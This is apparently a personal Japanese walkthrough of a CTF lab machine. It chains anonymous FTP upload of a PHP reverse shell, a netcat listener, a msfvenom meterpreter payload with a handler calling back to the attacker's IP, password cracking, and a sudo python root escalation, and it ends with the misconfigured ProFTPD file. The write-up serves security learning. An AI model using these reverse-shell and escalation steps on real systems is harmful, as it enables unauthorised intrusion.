- スナップショットをとる
### 論点
- ftpでphp-reverse-shell
### keyword
- ディレクトリ リスティング,hashes.comは使えない,crack station,pkexec,su,sudo-l(python)
### 課題
- ftp,/tmpの両方にx64,x86のmsfvenomをおいたが、reverse-shellは失敗する

## 攻略(1)
- nmap
  - ftpにanoymousで接続できるのがわかる
- gobuster
  - `gobuster dir -u $IP -w $dirsmall`
  - `files`というパスがあって、ブラウザで見るとディレクトリリスティングのサイトであることがわかる
- ftpに接続する
  - `ftp $IP`
  - CALL.htmlというファイルがある。これは、さっき見たディレクトリリスティングの中が見れているのだとわかる
- ftpからphp-reverse-shell.phpをシステムの内部に送ることでreverse-shellをすることができるんではないかと考える
  - php-reverse-shell.phpを探す
  - `locate php-reverse-shell.php | grep webshells` パスをcopyしておく
  -  `cat ペースト > php-reverse-shell.php`
    - よく使うので自分のhomeのtoolsフォルダの中に入れておく  
  -  vimでopenしてipをParrotのアドレスに書き換える。portは書いてあるので覚えておく
  - ftpに接続後`put php-reverse-shell.php` 
- Parrotで新しいターミナルで待ち受ける
  - `nc -nlvp ?` 
- ディレクトリリスティングのサイトにさっきputしたreverse-shellがあるので実行する
- 対話型シェルにする
  - pythonは2または3どっちか? 
- `important.txt`がある
  - `/.runme.sh`にパスワードとユーザ名がわかる。
- crack stationからonionがわかる
- `su shrek`
- SUID
  - pkexecにgccもあるので使える
  - PwnKit使える
  - それ以外は使えそうにない
- `sudo -l`
- `sudo python3.5 -c 'import os; os.system("/bin/bash")'`  

## 攻略(2)
- php-reverse-shell.phpを送る代わりにftpにmsfvenomを送る
- `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f raw -o reverse.php`
- reverse.phpをftpでuploadする
- handlerで待ち受ける

```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.56.104
set lport 4444
run
```

- 対話型シェルにして、あとは同じ
- `su shrek` password:onion
- システム内探索ランキングする
- 注意
  - suggesterやっても何も出ない
  - pkexecもできない

## 参考
- Proftpdの設定ファイルを探す方法
  - `proftpd -V` 
- 実際にある場所
  - `/usr/local/etc/proftpd.conf`
  - ファイルの下の方で、そこで設定してある
    - `<Anonymous /var/www/html/files/>`

```
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21

# Don't use IPv6 support by default.
UseIPv6				off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask				022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances			30

# Set the user and group under which the server will run.
User				ftp
Group				ftp

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
#DefaultRoot ~

# Normally, we want files to be overwriteable.
AllowOverwrite		on

# Bar use of SITE CHMOD by default
<Limit SITE_CHMOD>
  DenyAll
</Limit>

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous /var/www/html/files/>
  User				ftp
  Group				ftp
  AnonRequirePassword		off

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias			anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients			10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  DisplayLogin			welcome.msg
  DisplayChdir			.message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    AllowAll
  </Limit>
</Anonymous>
```
